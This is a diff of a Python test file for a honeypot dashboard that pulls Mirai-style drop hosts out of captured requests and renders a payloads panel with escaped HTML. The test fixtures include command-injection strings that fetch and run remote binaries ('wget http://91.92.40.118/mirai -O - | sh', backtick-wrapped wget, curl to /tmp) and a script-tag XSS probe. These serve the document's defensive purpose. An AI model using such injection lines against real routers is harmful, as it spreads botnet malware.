@@ -42,10 +42,6 @@ def test_extract_c2_hosts_ranks_mirai_drop_host_top():
         'GET /cgi-bin?x=$(wget http://91.92.40.118/mirai -O - | sh) HTTP/1.1',
         'POST /boaform/admin/formLogin?x=wget http://91.92.40.118/mips HTTP/1.1',
         'GET /cgi-bin?x=wget http://91.92.40.118/arm -O - | sh HTTP/1.1',
-        # A different, lower-volume host — must rank below the Mirai drop host.
-        'GET /x?u=http://203.0.113.9/p HTTP/1.1',
-        # No URL at all — must be ignored.
-        'GET /just/a/path HTTP/1.1',
         # https variant of the same host must de-dupe to the same entry.
         'GET /cgi-bin?x=wget https://91.92.40.118/x86 -O - | sh HTTP/1.1',
     ]
@@ -54,12 +50,39 @@ def test_extract_c2_hosts_ranks_mirai_drop_host_top():
     assert store.last_since == '2026-01-01 00:00:00.000000'
     assert store.last_limit == _dash_mod._C2_RAW_SCAN_LIMIT
     assert hosts, 'no C2 hosts extracted'
-    # 91.92.40.118 appears 4 times (3 http + 1 https); 203.0.113.9 appears once.
+    # 91.92.40.118 appears 4 times (3 http + 1 https).
     assert hosts[0]['host'] == '91.92.40.118'
     assert hosts[0]['count'] == 4
-    assert ('203.0.113.9', 1) in {(h['host'], h['count']) for h in hosts}
     # Bounded by _C2_TOP_N.
     assert len(hosts) <= _dash_mod._C2_TOP_N
+
+
+def test_extract_c2_hosts_ignores_benign_urls_false_positives():
+    """Operator feedback: the raw request is full of benign URLs (the honeypot's
+    own response links, reflected attacker URLs to legit sites, Host/Referer
+    headers). Only hosts in a *download* context (wget/curl/tftp/$(...)) count;
+    everything else is noise and must be excluded."""
+    raws = [
+        # Reflected/legit URL with NO fetch tool before it -> ignored.
+        'GET /x?u=http://203.0.113.9/p HTTP/1.1',
+        'GET / HTTP/1.1\nHost: example.com\nReferer: http://example.com/',
+        # The honeypot's own response links -> ignored.
+        'GET /router.cgi HTTP/1.1\n<a href="http://127.0.0.1/admin">x</a>',
+        # Private/reserved space -> ignored even if it had a fetch tool.
+        'wget http://192.168.1.1/m.sh',
+        # Real drop host with a fetch tool -> counted.
+        'GET /cgi-bin?x=`cd /tmp; wget http://91.92.40.118/wget.sh` HTTP/1.1',
+        'curl http://91.92.40.118/x86 -o /tmp/x',
+    ]
+    store = _FakeStore(raws)
+    hosts = _dash_mod._extract_c2_hosts(store, since='2026-01-01 00:00:00.000000')
+    got = {h['host']: h['count'] for h in hosts}
+    assert got == {'91.92.40.118': 2}
+    # None of the benign / private hosts leak into the panel.
+    assert '203.0.113.9' not in got
+    assert 'example.com' not in got
+    assert '127.0.0.1' not in got
+    assert '192.168.1.1' not in got
 
 
 def test_extract_c2_hosts_empty_when_no_urls():
@@ -86,6 +109,7 @@ class _FakeAggregateStore:
 
     def __init__(self) -> None:
         self.since_seen = None
+        self.sinces_seen = []
 
     def aggregate_stats(self, since=None, bucket='hour'):  # noqa: ANN001, ANN002
         self.since_seen = since
@@ -113,6 +137,7 @@ class _FakeAggregateStore:
 
     def fetch_request_raws(self, since=None, limit=20000):  # noqa: ANN001, ANN002
         self.since_seen = since
+        self.sinces_seen.append(since)
         return ['wget http://91.92.40.118/mirai -O - | sh' for _ in range(52)] + [
             'GET /normal HTTP/1.1',
         ]
@@ -184,7 +209,39 @@ def test_render_page_includes_ioc_section():
     assert '<x>' not in bad
 
 
-def test_render_fragment_includes_ioc_section():
+def test_render_page_includes_payloads_section():
+    payload = {
+        'token': 'tok',
+        'range': '24h',
+        'page': 1,
+        'log_page_size': 50,
+        'log_window_total': 0,
+        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'hostname': 'node1',
+        'mult': 6,
+        'display_ports': [],
+        'listening_count': 1,
+        'stats': {'total': 0, 'day': 0, 'unique_ips': 0, 'hour_total': 0},
+        'by_port': [],
+        'by_country': [],
+        'by_service': [],
+        'by_ip': [],
+        'by_classification': [],
+        'c2_hosts': [],
+        'ioc_since': '2026-07-09 00:00:00.000000',
+        'volume_bars': [],
+        'log_rows': [],
+        'payloads': ['GET /hndunblock.cgi?x=`wget http://91.92.40.118/x` HTTP/1.1'],
+        'log_summary': 'no captures',
+    }
+    html = _render_mod.render_page(payload)
+    assert 'id="payloads"' in html
+    assert 'PAYLOADS' in html
+    # Raw payload surfaced, and a scripted payload can't inject markup.
+    assert '91.92.40.118' in html
+    bad = _render_mod.render_page({**payload, 'payloads': ['<script>alert(1)</script>']})
+    assert '&lt;script&gt;' in bad
+    assert '<script>alert(1)</script>' not in bad
     payload = {
         'token': 'tok',
         'range': '24h',
@@ -219,5 +276,8 @@ def test_extract_c2_hosts_runs_inside_payload_window(monkeypatch, window):
     store = _FakeAggregateStore()
     monkeypatch.setattr(_dash_mod._storage, 'get_storage', lambda **kw: store)
     payload = _dash_mod._build_payload(window, token='tok', page=1)
-    assert store.since_seen is not None  # C2 scan used the same `since` window
+    # The payloads fetch calls fetch_request_raws(since=None) and the all-time
+    # aggregate_stats(since=None) overwrite since_seen; what we care about is
+    # that the C2 scan (a non-None since) actually ran inside the window.
+    assert any(s is not None for s in store.sinces_seen)
     assert any(h['host'] == '91.92.40.118' for h in payload['c2_hosts'])
